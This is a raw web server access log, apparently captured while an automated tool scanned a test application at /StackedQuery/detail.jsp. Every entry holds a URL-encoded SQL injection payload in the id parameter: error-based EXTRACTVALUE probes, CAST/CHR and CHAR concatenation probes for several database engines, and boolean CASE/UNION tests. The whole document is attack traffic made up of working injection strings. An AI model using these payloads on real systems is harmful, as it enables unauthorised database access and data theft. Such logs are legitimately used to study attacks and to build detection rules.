10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=%28SELECT%20%28CASE%20WHEN%20%286230%3D4457%29%20THEN%201%20ELSE%20%28SELECT%204457%20UNION%20SELECT%209706%29%20END%29%29 HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=%28SELECT%20%28CASE%20WHEN%20%288698%3D8698%29%20THEN%201%20ELSE%20%28SELECT%209556%20UNION%20SELECT%206883%29%20END%29%29 HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%29%20AND%20EXTRACTVALUE%285327%2CCONCAT%280x5c%2C0x7170626b71%2C%28SELECT%20%28ELT%285327%3D5327%2C1%29%29%29%2C0x7171717a71%29%29%20AND%20%284496%3D4496 HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%20AND%20EXTRACTVALUE%285327%2CCONCAT%280x5c%2C0x7170626b71%2C%28SELECT%20%28ELT%285327%3D5327%2C1%29%29%29%2C0x7171717a71%29%29 HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%20AND%20EXTRACTVALUE%285327%2CCONCAT%280x5c%2C0x7170626b71%2C%28SELECT%20%28ELT%285327%3D5327%2C1%29%29%29%2C0x7171717a71%29%29--%20oeWv HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%27%29%20AND%20EXTRACTVALUE%285327%2CCONCAT%280x5c%2C0x7170626b71%2C%28SELECT%20%28ELT%285327%3D5327%2C1%29%29%29%2C0x7171717a71%29%29%20AND%20%28%27MHxE%27%3D%27MHxE HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%27%20AND%20EXTRACTVALUE%285327%2CCONCAT%280x5c%2C0x7170626b71%2C%28SELECT%20%28ELT%285327%3D5327%2C1%29%29%29%2C0x7171717a71%29%29%20AND%20%27tIeL%27%3D%27tIeL HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%29%20AND%203340%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283340%3D3340%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%285116%3D5116 HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%20AND%203340%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283340%3D3340%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29 HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%20AND%203340%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283340%3D3340%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20SPcg HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%27%29%20AND%203340%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283340%3D3340%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27Iutp%27%3D%27Iutp HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%27%20AND%203340%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283340%3D3340%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27uuSI%27%3D%27uuSI HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%29%20AND%204162%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284162%3D4162%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%20AND%20%288075%3D8075 HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%20AND%204162%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284162%3D4162%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29 HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%20AND%204162%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284162%3D4162%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29--%20leiJ HTTP/1.1" 200 1653
10.59.90.204 - - [21/Dec/2023:08:35:16 +0700] "GET /StackedQuery/detail.jsp?id=1%27%29%20AND%204162%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284162%3D4162%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%20AND%20%28%27bHeF%27%3D%27bHeF HTTP/1.1" 200 1653
